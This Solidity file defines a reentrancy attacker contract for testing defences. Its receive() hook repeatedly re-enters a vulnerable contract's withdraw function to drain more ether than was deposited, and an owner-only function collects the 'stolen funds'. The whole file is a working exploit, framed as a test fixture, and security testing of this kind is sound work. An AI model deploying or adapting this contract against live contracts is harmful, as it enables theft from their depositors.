// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IVulnerable {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
    function getBalance(address user) external view returns (uint256);
}

/**
 * @title ReentrancyAttacker
 * @notice Contract designed to perform reentrancy attacks for testing
 * @dev This is for testing defensive measures against reentrancy
 */
contract ReentrancyAttacker {
    IVulnerable public vulnerableContract;
    address public owner;
    uint256 public attackCount;
    uint256 public maxAttacks = 5;

    event AttackStarted(uint256 initialBalance);
    event ReentrancyExecuted(uint256 count, uint256 balance);
    event AttackCompleted(uint256 stolenAmount);

    constructor(address _vulnerableContract) {
        vulnerableContract = IVulnerable(_vulnerableContract);
        owner = msg.sender;
    }

    /**
     * @notice Start the reentrancy attack
     */
    function attack() external payable {
        require(msg.value > 0, "Need ether to attack");

        // Deposit into vulnerable contract
        vulnerableContract.deposit{value: msg.value}();
        emit AttackStarted(msg.value);

        // Start the reentrancy attack
        attackCount = 0;
        vulnerableContract.withdraw(msg.value);
    }

    /**
     * @notice Receive function that performs the reentrancy
     */
    receive() external payable {
        attackCount++;
        emit ReentrancyExecuted(attackCount, address(this).balance);

        if (attackCount < maxAttacks) {
            uint256 balance = vulnerableContract.getBalance(address(this));
            if (balance > 0) {
                vulnerableContract.withdraw(balance);
            }
        } else {
            emit AttackCompleted(address(this).balance);
        }
    }

    /**
     * @notice Withdraw stolen funds
     */
    function withdraw() external {
        require(msg.sender == owner, "Only owner");
        payable(owner).transfer(address(this).balance);
    }

    /**
     * @notice Get this contract's balance
     */
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }

    /**
     * @notice Set maximum attack iterations
     */
    function setMaxAttacks(uint256 _max) external {
        require(msg.sender == owner, "Only owner");
        maxAttacks = _max;
    }
}
